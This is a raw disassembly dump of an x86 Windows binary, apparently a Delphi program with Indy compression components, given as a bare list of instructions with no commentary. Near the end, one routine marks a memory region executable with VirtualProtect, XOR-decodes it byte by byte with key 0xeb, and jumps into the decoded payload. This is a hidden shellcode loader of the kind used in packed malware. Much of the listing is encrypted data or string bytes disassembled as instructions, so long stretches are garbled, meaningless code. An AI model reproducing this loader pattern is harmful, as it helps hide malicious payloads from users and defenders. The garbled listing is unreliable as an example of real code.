pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b174
retn
sub_46b180
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b1a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1ac
retn
sub_46b1b8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ac#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1e4
retn
sub_46b1f0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ac#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b21c
retn
sub_46b22a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x46 ] dh
add [ eax + eax ] cl
add [ eax ] al
pop eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ edx + 0xc0046 ]
add [ eax ] al
sub [ edx + 0x34a00046 ] dh
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
outsd
insd
jo r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] dl
inc ebp
dec ecx
inc ebx
outsd
insd
jo r-xdata
je r-xdata
jae r-xdata
jb r-xdata
jae r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] dl
inc ebp
popad
insb
jne r-xdata
outsd
jb r-xdata
imul ebp [ ebp + esi * 2 + 0x72 ] 0xb3a89065
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] al
inc esi
imul ebp [ edi + 0x6e ] 0x65637845
jo r-xdata
add [ ecx ] al
adc [ ebx + eax * 2 + 0x6f ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi + eax * 2 + 0xc00 ] dh
add [ eax ] ch
mov dl 0x46
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b3 ] ch
add [ eax ] al
add [ eax ] ch
mov dl 0x46
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
nop
test al 0xb3
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
inc esp
arpl [ gs : edi + 0x6d ] bp
jo r-xdata
test al 0x34
inc eax
mov bl 0x46
outsb
imul esi [ esi + eax * 2 + 0x61 ] 0x72756c69
lea eax [ eax ]
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x44644945 ] dl
arpl [ gs : edi + 0x6d ] bp
jo r-xdata
mov ah 0x46
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x34a00046 ] dh
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ esi + ebx * 4 - 0x607bffbf ] cl
jae r-xdata
insd
jo r-xdata
inc ebx
outsd
imul ebp [ edi + 0x6e ] 0x6f727245
jb r-xdata
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax + 0x18 ] bl
xor al [ eax ]
lodsb [ esi ]
jae r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6576654c
jae r-xdata
inc esi
add [ ecx + ebx ] bl
inc esi
add [ eax ] dh
sbb [ esi ] eax
inc eax
sbb [ esi ] eax
push esp
sbb [ esi ] eax
xor al 0x18
inc esi
add [ eax + ebx ] dl
inc esi
add al ch
mov dh 0x46
add [ eax + edi * 4 + 0x46 ] bh
add [ edi ] dl
push esp
dec ecx
inc ebx
outsd
insd
jo r-xdata
inc ecx
add [ edi + ebx * 4 - 0x5e4bffbf ] al
inc ecx
add [ esi + ebx * 4 - 0x616bffbf ] bl
inc ecx
add [ ecx + 0x18580041 ] bh
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ esi + ebx * 4 + 0x41 ] bh
add ah dh
sbb [ esi ] al
mov [ esi - 0x607bffbf ] ds
imul ebp [ edi + 0x6e ] 0x6576654c
insb
add [ eax ] eax
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ esp + esi * 4 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
mov ah 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov ah 0x46
add ah ch
add [ eax ] al
add [ esi + edx - 0x5e63ffba ] bl
inc ecx
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ebp + esi * 4 + 0x45e40046 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov ah 0x46
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x34a00046 ] dh
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
mov ch 0x46
add ah ah
inc ebp
imul ebp [ edi + 0x6e ] 0x6f727245
jb r-xdata
inc eax
outsb
imul esi [ esi + eax * 2 + 0x61 ] 0x72756c69
jbe r-xdata
imul ebp [ edi + 0x6e ] 0x65746e49
jb r-xdata
dec ecx
inc ebx
outsd
insd
jo r-xdata
shl [ esp + esi * 4 ] 0x46
add al ch
adc esi [ ecx - 0x7 ]
dec [ ebx + 0xe086 ]
insb
nop
jae r-xdata
jo r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
add al ch
or [ ecx - 0x7 ] dh
dec [ ebx - 0x31d7f2d ]
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
xchg al ah
add [ eax ] al
add [ eax ] al
je r-xdata
clc
mov ah 0x46
add [ edi ] al
pop ss
push esp
dec ecx
inc ebx
outsd
insd
jo r-xdata
cmp [ ebx + 0xb9 ] 0x0
lea eax [ ebx + 0x61 ]
call sub_4631f4
lea eax [ ebx + 0x61 ]
xor ecx ecx
jae r-xdata
pop ebx
retn
lea eax [ ebx + 0x99 ]
call sub_4642d4
lea eax [ ebx + 0x99 ]
xor ecx ecx
mov edx 0x38
call sub_402c64
mov edx 0x38
call sub_402c64
leave
imul ebp [ edi + 0x6e ] 0x65746e49
jb r-xdata
jl r-xdata
jo r-xdata
dec [ ebp - 0x36cc9ebd ]
je r-xdata
mov ecx 0x0
sub_46b560
push ebx
mov ebx eax
cmp [ ebx + 0x81 ] 0x0
je r-xdata
cmp [ ebx + 0xb9 ] 0x0
je r-xdata
lea eax [ ebx + 0x61 ]
call sub_4631f4
lea eax [ ebx + 0x61 ]
xor ecx ecx
mov edx 0x38
call sub_402c64
pop ebx
retn
lea eax [ ebx + 0x99 ]
call sub_4642d4
lea eax [ ebx + 0x99 ]
xor ecx ecx
mov edx 0x38
call sub_402c64
sub_46b5ac
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_46b560
mov eax [ esi + 0xd4 ]
call sub_4026dc
mov eax [ esi + 0xe0 ]
call sub_4026dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_46b5f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b6d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x81 ] 0x0
jne r-xdata
cmp [ ebx + 0xb9 ] 0x0
jne r-xdata
mov eax sub_4626dc
mov [ ebx + 0x81 ] eax
mov eax sub_4626e8
mov [ ebx + 0x85 ] eax
push 0x38
mov ecx r-xdata
xor edx edx
mov dl [ ebx + 0x60 ]
lea eax [ ebx + 0x61 ]
call sub_4626f0
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b6db
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov eax sub_4626dc
mov [ ebx + 0xb9 ] eax
mov eax sub_4626e8
mov [ ebx + 0xbd ] eax
mov edx r-xdata
lea eax [ ebx + 0x99 ]
mov ecx 0x38
call sub_46445c
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_46b6e6
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffff7f4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x80c ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ac#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x60 ]
dec eax
sub al 0x9
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b876
lea eax [ ebp - 0x80c ]
call sub_403fa8
retn
mov eax ebx
call sub_46b5f0
mov [ ebp - 0x5 ] 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_415c20
mov edx [ ebx + 0xd4 ]
mov ecx [ ebx + 0xd8 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x10 ]
xor eax eax
mov [ ebx + 0xd8 ] eax
lea edx [ ebp - 0x805 ]
mov [ ebx + 0x99 ] edx
mov [ ebx + 0x9d ] eax
xor eax eax
mov [ ebx + 0xa1 ] eax
jmp r-xdata
cmp [ ebx + 0x9d ] 0x0
jg r-xdata
mov eax [ ebx + 0xdc ]
cmp eax [ ebx + 0xd8 ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebx + 0xd4 ]
add eax [ ebx + 0xd8 ]
mov [ ebx + 0xa5 ] eax
mov esi [ ebx + 0xdc ]
sub esi [ ebx + 0xd8 ]
mov [ ebx + 0xa9 ] esi
xor eax eax
mov [ ebx + 0xad ] eax
lea eax [ ebx + 0x99 ]
xor edx edx
call sub_464488
add eax 0x4
sub eax 0x3
jb r-xdata
test eax eax
jne r-xdata
lea edx [ ebp - 0x805 ]
mov ecx 0x800
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0x80c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x80c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub eax 0x2
jne r-xdata
add [ ebx + 0xdc ] 0x400
mov [ ebx + 0xdc ] 0x800
jmp r-xdata
sub esi [ ebx + 0xa9 ]
add [ ebx + 0xd8 ] esi
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
lea eax [ ebx + 0xd4 ]
mov edx [ ebx + 0xdc ]
call sub_4026fc
sub_46b87c
push ebp
mov ebp esp
add esp 0xfffffbfc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x404 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x60 ]
dec eax
sub al 0x9
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b9f5
lea eax [ ebp - 0x404 ]
call sub_403fa8
retn
mov eax ebx
call sub_46b5f0
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebx + 0xe8 ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jge r-xdata
cmp eax [ esp ]
pop edx
pop eax
jae r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0xe0 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov [ ebx + 0xe4 ] eax
mov eax [ ebx + 0xe0 ]
mov [ ebx + 0x61 ] eax
mov eax [ ebx + 0xe4 ]
mov [ ebx + 0x65 ] eax
push 0x0
push 0x0
mov eax esi
call sub_415c20
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jmp r-xdata
cmp [ ebx + 0x65 ] 0x0
jg r-xdata
jle r-xdata
cmp eax 0x800
jbe r-xdata
lea eax [ ebp - 0x400 ]
mov [ ebx + 0x6d ] eax
mov [ ebx + 0x71 ] 0x400
lea eax [ ebx + 0x61 ]
mov edx 0x2
call sub_462e74
add eax 0x4
sub eax 0x3
jae r-xdata
mov [ ebx + 0xe8 ] 0x800
mov eax esi
mov edx [ eax ]
call [ edx ]
mov edi eax
push 0x0
push 0x400
mov eax esi
mov edx [ eax ]
call [ edx ]
add eax 0x3ff
adc edx 0x0
call sub_404da0
add edi eax
mov [ ebx + 0xe8 ] edi
jmp r-xdata
jmp r-xdata
mov ecx 0x400
sub ecx [ ebx + 0x71 ]
lea edx [ ebp - 0x400 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
lea edx [ ebp - 0x404 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x404 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
lea eax [ ebx + 0xe0 ]
mov edx [ ebx + 0xe8 ]
call sub_4026fc
sub_46b9fc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x60 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_46b560
test bl bl
jae r-xdata
cmp bl 0x9
jbe r-xdata
xor ebx ebx
mov [ esi + 0x60 ] bl
mov bl 0x9
sub_46ba24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ba49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ba50
retn
sub_46ba60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x9c0046bc
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + eax * 2 + 0x32800 ] 0x0
je r-xdata
inc ebp
add [ eax ] al
inc ebp
inc ecx
add [ eax + 0x58 ] dh
inc ebp
add [ eax + ebx * 2 + 0x59b80045 ] ch
inc ebp
add [ eax ] cl
int 0x43
add [ ecx + 0x62300041 ] dh
inc ebp
add [ esi + ebx * 4 - 0x622fffbf ] dl
inc ebp
add [ eax ] cl
push ebx
inc ebp
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax + 0x10004437 ] dh
pop edi
inc ebp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ eax ] al
inc ebp
add al bl
int1
inc ebx
add al dh
int3
inc ebp
add [ ecx + 0x54940041 ] bl
inc ebp
add [ eax + 0x56 ] cl
inc ebp
add [ esp + esi + 0x7ab40040 ] dh
inc ebp
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x20004556 ] dh
inc edx
inc esp
add [ eax ] ah
pop esp
sub_46bcd8
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
mov [ ebp - 0x14 ] eax
nop
nop
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_403198
sub_46bd0c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov al [ eax ]
mov [ ebp - 0x9 ] al
nop
nop
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
nop
xor [ ebp - 0x9 ] 0xeb
nop
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
jae r-xdata
call sub_403198
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x54cf
jne r-xdata
call sub_403198
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
mov esp ebp
pop ebp
retn
sub_46bd60
push ebp
mov ebp esp
add esp 0xfffffff0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
nop
push r-xdata
call sub_46bd60
jpo r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x54ce
mov eax [ ebp + 0x8 ]
push eax
call VirtualProtect
nop
nop
mov eax [ ebp + 0x8 ]
call sub_46bd0c
mov eax [ ebp + 0x8 ]
add eax 0x1918
jae r-xdata
add bh ah
jpo r-xdata
mov [ ebp - 0x4 ] eax
nop
jmp [ ebp - 0x4 ]
call sub_403198
cld
jpo r-xdata
jmp r-xdata
in al 0x5c
adc al 0xbb
add ch [ 0x7bebeba6 ]
add dh [ ebx + 0x14ebebe5 ]
sahf
jpo r-xdata
jpo r-xdata
stc
dec [ ecx - 0x6f03bb ]
cld
nop
scasb [ edi ]
sti
mov [ 0xffffffffee2b80e9 ] ax
and [ edx ] 0xee
push ecx
adc al 0xfe
jmp r-xdata
pop esp
sub_46bf8a
test [ edx ] 0xebebc606
jpo r-xdata
out 0xeb al
jpo r-xdata
jmp sub_46c08c
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ edx ]
jpo r-xdata
call 0x301e743
push ebx
cld
jmp r-xdata
lodsd [ esi ]
jpo r-xdata
push es
jmp sub_46c07f
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4cff ]
jpo r-xdata
jmp sub_46c02c
jg r-xdata
nop
lodsd [ esi ]
jpo r-xdata
pop es
add [ ebx + 0x628dce81 ] esi
jpo r-xdata
mov ebp 0xeba53403
jmp sub_46bff2
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov bl 0x81
add [ edx ] 0x1
or esi 0x7ae628d
jpo r-xdata
jpo r-xdata
outsd

outsd
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
fsubr st3
jpo r-xdata
outsd
iretd
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
sti
out dx eax
jmp r-xdata
scasb [ edi ]
jmp sub_46c110
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
into
jpo r-xdata
mov eax [ 0x7b7bebeb ]
jpo r-xdata
bound ebp [ esi - 0x7d7e4cf9 ]
add al [ ecx ]
jpo r-xdata
add edi [ edi - 0x3e ]
sub_46c02c
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4cff ]
jpo r-xdata
nop
lodsd [ esi ]
jpo r-xdata
pop es
add [ ebx + 0x628dce81 ] esi
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov bl 0x81
add [ edx ] 0x1
or esi 0x7ae628d
jpo r-xdata
outsd

outsd
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
outsd
iretd
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
sti
out dx eax
jmp r-xdata
scasb [ edi ]
jpo r-xdata
jmp sub_46c02c
jg r-xdata
mov ebp 0xeba53403
jmp sub_46bff2
jmp r-xdata
jpo r-xdata
fsubr st3
jpo r-xdata
jmp sub_46c110
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
into
jpo r-xdata
mov eax [ 0x7b7bebeb ]
jpo r-xdata
bound ebp [ esi - 0x7d7e4cf9 ]
add al [ ecx ]
jpo r-xdata
add edi [ edi - 0x3e ]
sub_46c06e
in al 0x49
bound esi [ esi - 0x131bfde9 ]
jmp r-xdata
push edi
stosd [ edi ]
jmp r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
mov esi 0x76a0760
in al 0x6f
jpo r-xdata
jpo r-xdata
out dx eax
jmp r-xdata
add esp edi
jpo r-xdata
outsd
iretd
sti
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
jmp r-xdata
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
sbb edx [ eax ]
adc al 0x14
add eax [ edi ]
fsub st3
jmp r-xdata
push 0x2eb178e
outsd
sub_46c075
in al dx
jmp r-xdata
push edi
stosd [ edi ]
jmp r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
mov esi 0x76a0760
in al 0x6f
jpo r-xdata
jpo r-xdata
out dx eax
jmp r-xdata
add esp edi
jpo r-xdata
outsd
iretd
sti
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
jmp r-xdata
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
sbb edx [ eax ]
adc al 0x14
add eax [ edi ]
fsub st3
jmp r-xdata
push 0x2eb178e
outsd
sub_46c0cd
push 0xe4ebe396
outsd
add esp edi
jmp r-xdata
out dx eax
jmp r-xdata
jpo r-xdata
outsd
iretd
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
sti
sub_46c103
jpo r-xdata
jmp j_sub_46c1ea
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp j_sub_46c1a8
adc al 0xbd
jecxz r-xdata
bound ebp [ esi - 0x317e4cff ]
lea esp [ edx - 0x52 ]
pop es
mov bl 0x81
add [ edx ] 0x1
mov eax [ 0x7b7bebeb ]
jpo r-xdata
outsb
sub eax [ edx ]
inc edx
movsd [ edi ] [ esi ]
jmp r-xdata
push cs
xchg ecx eax
pop ebx
mov eax 0xeb277562
jmp j_sub_46c1d2
nop
stosd [ edi ]
jmp sub_46c170
nop
lodsd [ esi ]
jpo r-xdata
in al dx
jmp sub_46c0e9
jmp r-xdata
jmp r-xdata
jpo r-xdata
outsd

outsd
jpo r-xdata
outsd
iretd
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x9a
pop ss
add dh [ esi - 0x4114145b ]
pushad
pop es
push 0x7
sti
out dx eax
jmp r-xdata
sub_46c162
add bh [ esi + 0x7bebebc2 ]
jpo j_sub_46c1d2
jpo r-xdata
jpo r-xdata
adc al 0xbd
shl [ eax + 0x33 ] cl
push 0xb7021410
out 0xeb al
jmp j_sub_46c17c
adc al 0xbd
lahf
in al 0x5d
outsd
sub_46c230
push 0x6ee4da12
rcr ecx 0xeb
jmp r-xdata
jmp r-xdata
out 0x14 eax
fwait
jecxz r-xdata
cmpsb [ esi ] [ edi ]
and esp [ esi - 0x52 ]
inc ebx
add edi esi
mov al [ 0x2b6eebeb ]
in al 0x6f
sub al 0x3
mov ebx 0xb2ebebc9
mov dl 0xd8
sub ebp [ ebx - 0x14073efe ]
jmp r-xdata
iretd
sub_46c257
add [ edi - 0x2e21fd4f ] 0x7b7bebeb
jpo r-xdata
outsb
adc al 0x15
adc al 0x14
sub edx 0xc4cfaf66
mov ebx 0x73cf6f66
jmp r-xdata
jpo r-xdata
adc edx [ esp ]
mov sp 0x66ed
outsd
iretd
scasb [ edi ]
pop ss
fdiv [ eax ]
scasb [ edi ]
imul edi [ eax - 0x2f82fd45 ] 0xffffffeb
jmp r-xdata
jmp sub_46c2dc
sub_46c276
pop ecx
fldpi
jmp r-xdata
fild [ ebx ]
push eax
shr ebx cl
jmp r-xdata
jpo r-xdata
cmc
jmp r-xdata
jpo r-xdata
mov eax [ 0x2f68ebeb ]
out 0xd2 eax
mov bh 0xcf
jmp esp
jmp r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
outsb
and al [ edx ]
bswap edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
iretd
add cl [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
jpo r-xdata
jpo r-xdata
add [ ebp + 0x5a6628d ] 0xebe7cf02
jmp r-xdata
in al 0x6f
sub ch dh
jmp r-xdata
push ebx
scasb [ edi ]
inc ebx
add ebp [ ecx + 0x6eebeba1 ]
sub eax [ edx ]
sub ch dh
jmp r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jpo r-xdata
outsb
adc al 0xbd
lahf
lodsb [ esi ]
adc al 0xa7
iretd
cmp cl [ ebp + 0x21bbe62 ]
jmp r-xdata
fldpi
mov dl 0x81
test [ ebp + 0x205a662 ] ecx
iretd
lea esp [ edx - 0x5a ]
sbb [ edx + 0x628dc581 ] esi
cmpsb [ esi ] [ edi ]
pop ds
add bl cl
cmpsd [ esi ] [ edi ]
jmp r-xdata
in al 0x5c
sub edi [ ebx + 0x77022d60 ]
in eax 0xeb
jmp r-xdata
jmp r-xdata
outsb
jpo r-xdata
and edx [ esi ]
adc al 0x14
mov ebx 0xd88fbd14
and ch [ eax + 0x13 ]
adc al 0xe4
jle r-xdata
add cl [ eax - 0x37 ]
jmp r-xdata
jmp r-xdata
insd
jpo r-xdata
push ss
jpo r-xdata
jpo r-xdata
outsd
push 0x17
jmp r-xdata
adc al 0x14
add esi [ edx ]
fsubr st3
jmp r-xdata
add [ esi + 0x628d3a60 ] 0xc4021bbe
hlt
mov esi 0xf4c4021b
jmp r-xdata
pushad
stosd [ edi ]
out 0x60 eax
jmp r-xdata
pop ds
rcl [ esi ] cl
sar [ ecx - 0x44 ] 0x62
adc al 0x14
add cl ch
adc [ esp + edx ] dl
jpo r-xdata
pop ss
jmp r-xdata
mov dl 0x81
xchg ebx eax
add dh [ ebp + 0x7bebebd9 ]
jpo r-xdata
sub_46c449
lea esp [ edx - 0x52 ]
add eax 0x608581b3
and ecx [ ebp - 0x4de4599e ]
sbb [ edi + 0x19a6628d ] 0x8dc581b2
bound esp [ esi - 0x6c7e4de1 ]
add dh [ ebp + 0x7bebebd9 ]
jpo r-xdata
outsb
jpo r-xdata
insd
jpo r-xdata
push ss
jpo r-xdata
outsd
push 0x17
jmp r-xdata
adc al 0x14
add esi [ edx ]
fsubr st3
jmp r-xdata
add [ esi + 0x628d3a60 ] 0xc4021bbe
hlt
pop ds
rcl [ esi ] cl
sar [ ecx - 0x44 ] 0x62
adc al 0x14
add cl ch
adc [ esp + edx ] dl
jpo r-xdata
pop ss
sub_46c4db
shr [ ebp + 0x368e4ed ] 0x1
int1
jmp r-xdata
mov ebx 0xbbbc14b8
shr [ eax ] 0x1
add dh ah
shr bl 0x1
jmp r-xdata
jmp r-xdata
scasd [ edi ]
fdiv [ eax ]
scasb [ edi ]
arpl [ eax - 0x5d84fc45 ] di
loop r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
add esp esp
cli
jmp r-xdata
jmp r-xdata
enter 0xebfa 0xeb
push 0x3883ab2f
fisubr [ 0x6d62bcbd ]
inc edi
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
